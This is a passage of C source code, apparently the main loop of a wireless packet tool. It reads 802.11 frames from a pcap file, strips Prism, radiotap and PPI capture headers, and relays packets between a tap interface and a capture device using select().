                        opt.r_bssid[0],opt.r_bssid[1],opt.r_bssid[2],opt.r_bssid[3],opt.r_bssid[4],opt.r_bssid[5]);
        }
    }

    for( ; ; )
    {
        if(opt.s_file != NULL)
        {
            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                PCT; printf("Finished reading input file %s.\n", opt.s_file);
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
                SWAP32( pkh.caplen );
                SWAP32( pkh.len );
            }

            n = caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) )
            {
                PCT; printf("Finished reading input file %s.\n", opt.s_file);
                opt.s_file = NULL;
                continue;
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                PCT; printf("Finished reading input file %s.\n", opt.s_file);
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
            {
                /* remove the radiotap header */

                n = *(unsigned short *)( h80211 + 2 );

                if( n <= 0 || n >= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
            {
                /* remove the PPI header */

                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));

                if( n <= 0 || n>= (int) caplen )
                    continue;

                /* for a while Kismet logged broken PPI headers */
                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
                    n = 32;

                if( n <= 0 || n>= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }

            packet_recv( h80211, caplen, &apc, (opt.external & EXT_IN));
            msleep( 1000/opt.r_nbpps );
            continue;
        }

        FD_ZERO( &read_fds );
        FD_SET( dev.fd_in, &read_fds );
        FD_SET(ti_fd(dev.dv_ti), &read_fds );
        if(opt.external)
        {
            FD_SET(ti_fd(dev.dv_ti2), &read_fds );
            ret_val = select( MAX(ti_fd(dev.dv_ti), MAX(ti_fd(dev.dv_ti2), dev.fd_in)) + 1, &read_fds, NULL, NULL, NULL );
        }
        else
            ret_val = select( MAX(ti_fd(dev.dv_ti), dev.fd_in) + 1, &read_fds, NULL, NULL, NULL );
        if( ret_val < 0 )
            break;
        if( ret_val > 0 )
        {
            if( FD_ISSET(ti_fd(dev.dv_ti), &read_fds ) )
            {
                len = ti_read(dev.dv_ti, buffer, sizeof( buffer ) );
                if( len > 0  )
                {
                    packet_xmit(buffer, len);
                }
            }
            if( opt.external && FD_ISSET(ti_fd(dev.dv_ti2), &read_fds ) )
            {
                len = ti_read(dev.dv_ti2, buffer, sizeof( buffer ) );
                if( len > 0  )
                {
                    packet_xmit_external(buffer, len, &apc);
                }
            }
            if( FD_ISSET( dev.fd_in, &read_fds ) )
            {
                len = read_packet( buffer, sizeof( buffer ) );
                if( len > 0 )
                {
                    packet_recv( buffer, len, &apc, (opt.external & EXT_IN));
                }
            }
        } //if( ret_val > 0 )
    } //for( ; ; )

    ti_close( dev.dv_ti );


    /* that's all, folks */

    return( 0 );
}
